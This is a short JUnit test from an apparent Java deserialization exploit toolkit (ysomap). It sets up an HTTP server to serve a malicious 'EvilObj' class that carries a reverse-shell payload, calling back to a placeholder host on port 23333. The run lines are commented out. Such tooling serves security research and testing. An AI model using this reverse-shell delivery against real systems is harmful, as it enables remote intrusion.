package ysomap.core.exploit.http;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Exploit;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.objects.ClassWithReverseShell;
import ysomap.core.payload.java.objects.EvilFileWrapper;

/**
 * @author wh1t3P1g
 * @since 2020/10/28
 */
public class SimpleHTTPServerTest {

    @Test
    public void run() throws Exception {
        Exploit exploit = new SimpleHTTPServer();
        exploit.set("lport", "8081");
        exploit.set("path", "/EvilObj.class");
        Payload payload = new EvilFileWrapper();
        Bullet bullet = new ClassWithReverseShell();
        bullet.set("classname", "EvilObj");
        bullet.set("rhost", "ssss");
        bullet.set("rport", "23333");
        bullet.set("type", "class");
        payload.setBullet(bullet);
//        exploit.set("payload", payload.getObject());
//        exploit.run();
//        while(true);
    }
}